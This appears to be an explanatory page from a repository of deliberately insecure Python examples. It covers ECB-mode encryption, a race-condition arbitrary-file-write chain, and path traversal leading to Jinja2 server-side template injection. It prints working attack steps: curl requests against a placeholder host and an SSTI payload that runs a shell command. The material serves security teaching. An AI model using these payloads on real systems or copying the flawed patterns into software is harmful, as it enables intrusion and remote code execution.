# Contents

- [WeakEncryption.py](#weakencryptionpy)
- [RaceCondition.py](#raceconditionpy)
- [PathTraversal.py](#pathtraversalpy)

&nbsp;


## [WeakEncryption.py](../../examples/insecure/python/WeakEncryption.py)
Path: `/examples/insecure/python/WeakEncryption.py`

### Explanation

- It is not recommended to use ECB (Electronic Codebook) mode in AES encryption (line 1) because this mode encrypts data block by block without proper randomization. Instead, CBC (Cipher Block Chaining) mode or other cryptographically secure methods should be used. 

- When encryption is performed using ECB, patterns in the input data can still be observed in the output, making it insecure for certain types of data, especially images. For example:
   - If a block of data (a byte) is changed, only the specific block in the output is affected and the rest remains unchanged. This behavior is not suitable for encryption of sensitive or visual data.

- A visual example of ECB's block-by-block encoding is the well-known "ECB Tux" image:  
  ![ECB Tux Example](../../docs/img/ecb-tux.jpg)  
  As seen in this example, the penguin shape remains recognizable in the encrypted image, demonstrating ECB's vulnerability.

To better understand this vulnerability, I recommend reviewing the resources listed under cryptography in [Articles.md](../../docs/references/Articles.md).


&nbsp;


## [RaceCondition.py](../../examples/insecure/python/RaceCondition.py)

Path: `/examples/insecure/python/RaceCondition.py`

### Explanation

You cannot perform a directory traversal attack due to line 9. However, Absolute Path Manipulation + Arbitrary File Write via Race Condition can be applied

**Absolute Path Manipulation (`os.path.join`)**  
```python
src = os.path.join('contrib', 'languages', language_name)  # e.g., language_name = "/tmp/storage/malicious.tar"
```  
**Behavior and Vulnerability:**  

- If `language_name` contains an absolute path (e.g., `/tmp/storage/malicious.tar`), `os.path.join` **ignores previous components**:  
  ```python
  src = os.path.join('contrib', 'languages', '/tmp/storage/malicious.tar') 
  # Result: /tmp/storage/malicious.tar (removes contrib/languages/)

  dst = os.path.join('/tmp/extract', '/tmp/storage/malicious.tar') 
  # Result: /tmp/storage/malicious.tar (removes /tmp/extract)
  ```

- Since `src` and `dst` **point to the same file**, `shutil.copy` may raise a **SameFileError**. However, an attacker can bypass this error using a Race Condition attack.  

**Exploiting `shutil.copy` with a Race Condition**  
```python
shutil.copy(src, dst)  # Fails if source and destination are the same, BUT...
```  

1. **Step 1: Upload a Malicious TAR File via `/upload`**  
   ```bash
   curl -F "data=@malicious.tar" http://arastaci.com/upload -H "Content-Disposition: attachment; filename='/tmp/storage/malicious.tar'"
   ```  
   - The file is stored as `/tmp/storage/malicious.tar`.

2. **Step 2: Trigger the `install` Endpoint**  
   ```bash
   curl "http://arastaci.com/install?language_name=/tmp/storage/malicious.tar"
   ```

3. **Step 3: Quickly Delete the File (`/clean`)**  
   ```bash
   curl "http://arastaci.com/clean?file=/tmp/storage/malicious.tar"
   ```

#### **How the Race Condition Works:**  
- `shutil.copy` executes in **two steps**:  
  - If an attacker deletes `src` **after the existence check** but **before the copy operation**, `shutil.copy` **fails silently**.  
  - This does **not** prevent `unpack_archive(dst, extract_dir='/tmp/extract')` from executing, allowing the extraction of malicious files.  


&nbsp;

## [PathTraversal.py](../../examples/insecure/python/PathTraversal.py)

Path: `/examples/insecure/python/PathTraversal.py`

### Explanation

**Path Traversal + SSTI (Server-Side Template Injection)**  

At line 23, the username parameter received during user registration is directly appended to the file path.

**Issue:**  
- If the username parameter is set to `../templates/error.html`, the **notes_file** path resolves to `templates/error.html`. This allows overwriting the template file.

- Since templates/error.html is within the application’s root directory (app.root_path), **the validation does not fail**.


#### **Register with a Malicious Username**
```http
POST /register HTTP/1.1
...
username=../templates/error.html&password=test
```
- notes_file resolves to notes/../templates/error.html → templates/error.html

#### **Inject an SSTI Payload**
```http
POST /notes HTTP/1.1
...
notes={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
- This writes a malicious Jinja2 template payload into error.html

#### **Trigger the Error Page**
```http
GET /register?username=guest  # "Username already taken!" error
```
- The error.html template is rendered, executing the payload → **Displays the output of the `id` command**.

&nbsp;